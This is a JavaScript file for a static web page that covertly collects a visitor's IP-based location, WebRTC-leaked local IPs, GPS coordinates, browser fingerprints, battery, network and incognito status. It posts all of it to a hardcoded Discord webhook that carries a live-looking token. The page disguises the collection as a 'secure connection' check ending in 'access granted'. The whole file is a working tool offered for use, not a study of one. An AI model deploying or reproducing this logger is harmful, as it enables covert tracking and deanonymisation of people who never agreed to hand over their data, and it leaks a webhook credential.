// ============================================================
//  IP + Browser Fingerprint Collector → Discord Webhook
//  Static site compatible (GitHub Pages / Vercel)
// ============================================================

const WEBHOOK = "https://discord.com/api/webhooks/1517566170025295922/CFJ0HAfPbvx7WzSG-hakTqHtuUpLNrQ46mXhNxVyxYb1jyX8clmLJ8befhYiOvYLmxUG";

// ── Canvas fingerprint ────────────────────────────────────────
function canvasFingerprint() {
  try {
    const c = document.createElement("canvas");
    c.width = 240; c.height = 60;
    const ctx = c.getContext("2d");
    ctx.textBaseline = "alphabetic";
    ctx.fillStyle = "#f60"; ctx.fillRect(100, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.font = "11pt Arial";
    ctx.fillText("Cwm fjordbank 😊", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)";
    ctx.font = "18pt Arial";
    ctx.fillText("Cwm fjordbank", 4, 45);
    return c.toDataURL().slice(-50);   // last 50 chars as hash-ish
  } catch(e) { return "blocked"; }
}

// ── WebGL info ────────────────────────────────────────────────
function webglInfo() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return { vendor: "none", renderer: "none" };
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor:   ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
      renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
    };
  } catch(e) { return { vendor: "err", renderer: "err" }; }
}

// ── Battery ───────────────────────────────────────────────────
async function batteryInfo() {
  try {
    const b = await navigator.getBattery();
    return {
      level:    Math.round(b.level * 100) + "%",
      charging: b.charging ? "yes" : "no",
      chargingTime:    b.chargingTime    === Infinity ? "∞" : b.chargingTime    + "s",
      dischargingTime: b.dischargingTime === Infinity ? "∞" : b.dischargingTime + "s"
    };
  } catch(e) { return null; }
}

// ── Network info ──────────────────────────────────────────────
function networkInfo() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return null;
  return {
    type:          c.type          || "?",
    effectiveType: c.effectiveType || "?",
    downlink:      c.downlink      != null ? c.downlink + " Mbps" : "?",
    rtt:           c.rtt           != null ? c.rtt      + " ms"   : "?",
    saveData:      c.saveData ? "yes" : "no"
  };
}

// ── Installed plugins ─────────────────────────────────────────
function getPlugins() {
  try {
    return Array.from(navigator.plugins).map(p => p.name).join(", ") || "none";
  } catch(e) { return "blocked"; }
}

// ── Timezone offset ───────────────────────────────────────────
function tzOffset() {
  const off = new Date().getTimezoneOffset();
  const h = Math.floor(Math.abs(off) / 60);
  const m = Math.abs(off) % 60;
  return (off <= 0 ? "+" : "-") + String(h).padStart(2,"0") + ":" + String(m).padStart(2,"0");
}

// ── Geolocation (prompt) ──────────────────────────────────────
function getGeo() {
  return new Promise(res => {
    if (!navigator.geolocation) return res(null);
    navigator.geolocation.getCurrentPosition(
      p => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "m" }),
      () => res(null),
      { timeout: 6000 }
    );
  });
}

// ── IP + geo from ip-api ──────────────────────────────────────
async function fetchIPData() {
  const fields = "status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
  const r = await fetch(`https://ip-api.com/json/?fields=${fields}`);
  return r.json();
}

// ── WebRTC local IP leak ──────────────────────────────────────
function getWebRTCIPs() {
  return new Promise(res => {
    const ips = new Set();
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      pc.createDataChannel("");
      pc.createOffer().then(o => pc.setLocalDescription(o));
      pc.onicecandidate = e => {
        if (!e || !e.candidate) {
          pc.close();
          return res([...ips]);
        }
        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
        if (m) m.forEach(ip => ips.add(ip));
      };
      setTimeout(() => { pc.close(); res([...ips]); }, 3000);
    } catch(e) { res([]); }
  });
}

// ── Incognito detection (heuristic) ──────────────────────────
async function detectIncognito() {
  return new Promise(res => {
    try {
      const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
      if (!fs) return res("unknown");
      fs(window.TEMPORARY, 100, () => res("no"), () => res("likely yes"));
    } catch(e) { res("unknown"); }
  });
}

// ── Build & send Discord embed ────────────────────────────────
async function sendToWebhook(data) {
  const ip   = data.ip;
  const geo  = data.geo;
  const nav  = data.nav;
  const scr  = data.screen;
  const sys  = data.sys;
  const bat  = data.battery;
  const net  = data.network;
  const webrtc = data.webrtc;
  const gpsgeo  = data.gpsgeo;
  const wgl  = data.webgl;
  const incog = data.incognito;
  const ts   = new Date().toUTCString();

  const fields = [
    // IP block
    { name: "🌐 Public IP",        value: `\`${ip.query || "?"}\``,                                inline: true },
    { name: "📡 ISP",              value: `\`${ip.isp   || "?"}\``,                                inline: true },
    { name: "🏢 Org / ASN",        value: `\`${ip.org   || "?"} | ${ip.as || "?"}\``,              inline: false },
    { name: "🌍 Country",          value: `\`${ip.country || "?"} (${ip.countryCode || "?"})\``,   inline: true },
    { name: "🏙️ City / Region",    value: `\`${ip.city || "?"}, ${ip.regionName || "?"}\``,        inline: true },
    { name: "📮 ZIP / District",   value: `\`${ip.zip || "?"} / ${ip.district || "?"}\``,          inline: true },
    { name: "🗺️ Coordinates",      value: `\`${ip.lat}, ${ip.lon}\``,                              inline: true },
    { name: "🌐 Continent",        value: `\`${ip.continent || "?"} (${ip.continentCode || "?"})\``, inline: true },
    { name: "💱 Currency",         value: `\`${ip.currency || "?"}\``,                             inline: true },
    { name: "🕐 IP Timezone",      value: `\`${ip.timezone || "?"} (UTC${ip.offset != null ? (ip.offset >= 0 ? "+" : "") + (ip.offset/3600).toFixed(1) : "?"})\``, inline: true },
    { name: "📱 Mobile",           value: `\`${ip.mobile ? "yes" : "no"}\``,                       inline: true },
    { name: "🕵️ Proxy / VPN",      value: `\`${ip.proxy ? "yes ⚠️" : "no"}\``,                    inline: true },
    { name: "🖥️ Hosting / DC",     value: `\`${ip.hosting ? "yes ⚠️" : "no"}\``,                  inline: true },
    { name: "🔁 Reverse DNS",      value: `\`${ip.reverse || "none"}\``,                           inline: false },
    // WebRTC leak
    { name: "🔓 WebRTC IPs",       value: webrtc.length ? `\`${webrtc.join(" | ")}\`` : "`none leaked`", inline: false },
    // GPS
    gpsgeo
      ? { name: "📍 GPS Location", value: `\`${gpsgeo.lat}, ${gpsgeo.lon} (±${gpsgeo.acc})\`\nhttps://maps.google.com/?q=${gpsgeo.lat},${gpsgeo.lon}`, inline: false }
      : { name: "📍 GPS Location", value: "`denied / unsupported`", inline: false },
    // Browser / OS
    { name: "🧭 User Agent",       value: `\`\`\`${nav.ua.slice(0,200)}\`\`\``,                    inline: false },
    { name: "🗣️ Language(s)",      value: `\`${nav.langs}\``,                                       inline: true },
    { name: "🖥️ Platform",         value: `\`${nav.platform}\``,                                   inline: true },
    { name: "🍪 Cookies",          value: `\`${nav.cookies}\``,                                    inline: true },
    { name: "🚫 Do Not Track",     value: `\`${nav.dnt}\``,                                        inline: true },
    { name: "🕵️ Incognito",        value: `\`${incog}\``,                                          inline: true },
    { name: "🔌 Plugins",          value: `\`\`\`${sys.plugins.slice(0,200) || "none"}\`\`\``,     inline: false },
    // Screen / display
    { name: "🖥️ Screen",           value: `\`${scr.w}×${scr.h} (avail: ${scr.aw}×${scr.ah})\``,  inline: true },
    { name: "🪟 Window",           value: `\`${scr.iw}×${scr.ih}\``,                               inline: true },
    { name: "🎨 Color Depth",      value: `\`${scr.cd}-bit\``,                                     inline: true },
    { name: "🔍 Pixel Ratio",      value: `\`${scr.dpr}x\``,                                       inline: true },
    { name: "📐 Orientation",      value: `\`${scr.orient}\``,                                     inline: true },
    { name: "✋ Touch Points",     value: `\`${scr.touch}\``,                                      inline: true },
    // Hardware
    { name: "⚙️ CPU Cores",        value: `\`${sys.cpu}\``,                                        inline: true },
    { name: "🧠 Device Memory",    value: `\`${sys.mem} GB\``,                                     inline: true },
    { name: "🕐 Local TZ",         value: `\`${sys.tz} (UTC${sys.tzoff})\``,                       inline: true },
    // WebGL
    { name: "🎮 GPU Vendor",       value: `\`${wgl.vendor}\``,                                     inline: true },
    { name: "🖼️ GPU Renderer",     value: `\`${wgl.renderer.slice(0,60)}\``,                       inline: true },
    { name: "🖼️ Canvas FP",        value: `\`${sys.canvas}\``,                                     inline: false },
  ];

  // Add battery if available
  if (bat) {
    fields.push({ name: "🔋 Battery", value: `\`${bat.level} | charging: ${bat.charging} | discharge in: ${bat.dischargingTime}\``, inline: false });
  }
  // Add network if available
  if (net) {
    fields.push({ name: "📶 Connection", value: `\`type: ${net.type} | ${net.effectiveType} | ↓ ${net.downlink} | rtt: ${net.rtt} | saveData: ${net.saveData}\``, inline: false });
  }

  // Referrer
  fields.push({ name: "🔗 Referrer", value: `\`${document.referrer || "direct"}\``, inline: true });
  fields.push({ name: "📄 Page URL", value: `\`${location.href}\``, inline: false });
  fields.push({ name: "⏰ Timestamp", value: `\`${ts}\``, inline: false });

  const body = {
    username:   "fsociety-logger",
    avatar_url: "https://i.imgur.com/hXoFjrj.png",
    embeds: [{
      title:       "🖥️ New Connection Verified",
      description: `**IP:** \`${ip.query || "?"}\` — **${ip.city || "?"}, ${ip.country || "?"}**`,
      color:       0x00ff41,
      fields:      fields.slice(0, 25),   // Discord cap = 25 fields per embed
      footer:      { text: "fsociety terminal | data logged" },
      timestamp:   new Date().toISOString()
    }]
  };

  // If fields > 25 send a second embed
  if (fields.length > 25) {
    body.embeds.push({
      title:  "🖥️ Connection Data (cont.)",
      color:  0x00aa22,
      fields: fields.slice(25, 50),
      footer: { text: "fsociety terminal | overflow fields" }
    });
  }

  await fetch(WEBHOOK, {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify(body)
  });
}

// ── Main entry ────────────────────────────────────────────────
async function collect() {
  const btn = document.getElementById("btn");
  const status = document.getElementById("status");
  btn.disabled = true;
  status.textContent = ">> establishing secure connection...";

  try {
    // Fire all parallel tasks
    const [ipData, webrtcIPs, battery, gpsGeo, incognito] = await Promise.all([
      fetchIPData(),
      getWebRTCIPs(),
      batteryInfo(),
      getGeo(),
      detectIncognito()
    ]);

    const wgl = webglInfo();
    const net = networkInfo();

    const payload = {
      ip:       ipData,
      webrtc:   webrtcIPs,
      battery:  battery,
      gpsgeo:   gpsGeo,
      incognito: incognito,
      webgl:    wgl,
      network:  net,
      nav: {
        ua:       navigator.userAgent,
        langs:    (navigator.languages || [navigator.language]).join(", "),
        platform: navigator.platform,
        cookies:  navigator.cookieEnabled ? "enabled" : "disabled",
        dnt:      navigator.doNotTrack || "unset"
      },
      screen: {
        w:  screen.width,   h:  screen.height,
        aw: screen.availWidth, ah: screen.availHeight,
        iw: window.innerWidth, ih: window.innerHeight,
        cd: screen.colorDepth,
        dpr: window.devicePixelRatio || 1,
        orient: screen.orientation ? screen.orientation.type : "unknown",
        touch:  navigator.maxTouchPoints || 0
      },
      sys: {
        cpu:    navigator.hardwareConcurrency || "?",
        mem:    navigator.deviceMemory        || "?",
        tz:     Intl.DateTimeFormat().resolvedOptions().timeZone,
        tzoff:  tzOffset(),
        canvas: canvasFingerprint(),
        plugins: getPlugins()
      }
    };

    await sendToWebhook(payload);

    status.textContent = ">> connection verified. access granted.";
    btn.textContent = "[ AUTHENTICATED ]";
  } catch(err) {
    status.classList.add("err");
    status.textContent = ">> error: " + err.message;
    btn.disabled = false;
  }
}
